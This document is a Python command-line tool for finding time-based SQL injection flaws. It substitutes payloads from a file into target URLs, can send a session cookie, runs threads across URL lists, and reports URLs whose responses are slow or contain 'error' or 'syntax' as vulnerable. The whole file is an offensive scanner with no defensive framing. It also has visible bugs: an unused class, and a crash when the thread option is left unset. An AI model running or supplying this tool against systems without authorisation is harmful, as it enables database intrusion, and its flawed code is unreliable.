import argparse
import requests
import time
import threading
import os

class SQLiTimeBasedTool:
    def __init__(self, url, payload):
        self.url = url
        self.payload = payload

    def inject(self):
        # Send multiple requests with the same payload
        num_requests = 5
        total_response_time = 0
        for _ in range(num_requests):
            start_time = time.time()
            response = requests.get(self.url, params={"input": self.payload})
            end_time = time.time()
            total_response_time += end_time - start_time

        average_response_time = total_response_time / num_requests
        url_with_payload = f"{self.url}?input={self.payload}"

        # Analyze the response content
        if "error" in response.text.lower() or "syntax" in response.text.lower():
            print(f"\033[92m✓ Vulnerable! URL: {url_with_payload} - Average Response Time: {average_response_time:.2f} seconds\033[0m")
        elif average_response_time >= 10:
            print(f"\033[92m✓ Vulnerable! URL: {url_with_payload} - Average Response Time: {average_response_time:.2f} seconds\033[0m")
        else:
            print(f"\033[91m✗ Not Vulnerable. URL: {url_with_payload} - Average Response Time: {average_response_time:.2f} seconds\033[0m")

def perform_request(url, payload, cookie):
    url_with_payload = url.replace("*", payload)
    start_time = time.time()

    headers = {}
    if cookie:
        headers["Cookie"] = cookie

    try:
        response = requests.get(url_with_payload, headers=headers)
    except requests.RequestException as e:
        return False, url_with_payload, 0, str(e)

    response_time = time.time() - start_time
    if 200 <= response.status_code < 300:
        return True, url_with_payload, response_time, ""
    return False, url_with_payload, response_time, f"HTTP status code: {response.status_code}"

def process_payloads(url, payloads_file, cookie, output_file, all_results=False):
    results = []
    with open(payloads_file) as f:
        payloads = [line.strip() for line in f]

    for payload in payloads:
        # Treat the entire line as a single payload
        test_payload = url.replace("*", payload)

        success, url_with_payload, response_time, error_message = perform_request(test_payload, "", cookie)
        result_line = f"{url_with_payload} - Response Time: {response_time:.2f} seconds - Status: {'' if success else 'Failed'} - Error: {error_message}"

        if response_time >= 10 or (all_results and success):
            results.append(result_line)
            print(f"\033[92m{result_line}\033[0m")
        else:
            print(f"\033[91m{result_line}\033[0m")

        if output_file:
            with open(output_file, "a") as f:
                f.write(result_line + "\n")

    return results

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Single URL to scan.")
    parser.add_argument("-l", "--list", help="Text file containing a list of URLs to scan.")
    parser.add_argument("-p", "--payloads", required=True, help="Text file containing the payloads to append to the URLs.")
    parser.add_argument("-c", "--cookie", help="Cookie to include in the GET request.")
    parser.add_argument("-t", "--threads", type=int, help="Number of concurrent threads (0-10).")
    parser.add_argument("-o", "--output", help="File to save all results.")
    parser.add_argument("--all-results", action="store_true", help="Save all results, not just vulnerabilities.")
    args = parser.parse_args()

    if not args.url and not args.list:
        parser.error("Either --url or --list must be specified.")

    urls = [args.url] if args.url else [line.strip() for line in open(args.list)]

    threads = []
    for url in urls:
        if args.threads == 0:
            process_payloads(url, args.payloads, args.cookie, args.output, args.all_results)
        else:
            t = threading.Thread(target=process_payloads, args=(url, args.payloads, args.cookie, args.output, args.all_results))
            threads.append(t)
            t.start()

    if args.threads > 0:
        for t in threads:
            t.join()

if __name__ == "__main__":
    main()